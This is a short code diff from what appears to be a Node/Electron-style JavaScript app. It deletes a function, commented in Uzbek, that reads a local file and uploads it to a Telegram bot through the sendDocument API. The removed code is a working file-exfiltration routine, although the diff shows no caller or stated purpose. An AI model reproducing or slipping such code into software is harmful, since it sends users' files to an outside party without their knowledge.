@@ -391,35 +391,6 @@ if (installBtn) {
     });
 }
 
-// TELEGRAMGA FAYL YUBORISH FUNKSIYASI
-async function sendFileToTelegram(FilePath, caption = '') {
-    try {
-        if (!fs.existsSync(FilePath)) {
-            console.log('Fayl topilmadi:', FilePath);
-            return;
-        }
-
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('document', fs.createReadStream(FilePath));
-        if (caption) {
-            formData.append('caption', caption);
-        }
-
-        const response = await axios.post(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
-            formData,
-            {
-                headers: formData.getHeaders(),
-                maxContentLength: Infinity,
-                maxBodyLength: Infinity
-            }
-        );
-        console.log('Fayl Telegramga muvaffaqiyatli yuborildi!');
-    } catch (error) {
-        console.error('Telegramga yuborishda xatolik:', error.response ? error.response.data : error.message);
-    }
-}
 
 window.addEventListener('realtime-ready', async () => {
     isRealtimeInitialized = true;
